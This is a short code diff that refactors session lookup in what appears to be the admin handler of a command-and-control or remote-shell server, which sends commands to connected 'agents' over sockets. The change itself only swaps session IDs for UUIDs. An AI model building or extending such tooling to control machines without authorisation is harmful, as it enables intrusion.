@@ -71,11 +71,15 @@ def handle_admin_command(client_socket):
             response = session_mgr.list_sessions()
 
         elif action == 'exec_command':
-            sid = cmd['sid']
+            # --- UPDATED LOGIC FOR UUID SUPPORT ---
+            target_uid = cmd['uid']
             target_cmd = cmd['cmd']
             
-            if sid in session_mgr.sessions:
-                conn = session_mgr.sessions[sid]['socket']
+            # Find the active session by its UUID string
+            sid, session_info = session_mgr.get_session_by_uid(target_uid)
+            
+            if session_info:
+                conn = session_info['socket']
                 try:
                     # 1. Flush old data
                     try:
@@ -107,7 +111,7 @@ def handle_admin_command(client_socket):
                     response = f"[-] Connection Error: {e}"
                     session_mgr.remove_session(sid)
             else:
-                response = "[-] Session ID not found (It may have died)."
+                response = "[-] Session UUID not found (Agent might be dead or ID is wrong)."
 
         else:
             response = "[-] Unknown Server Command"
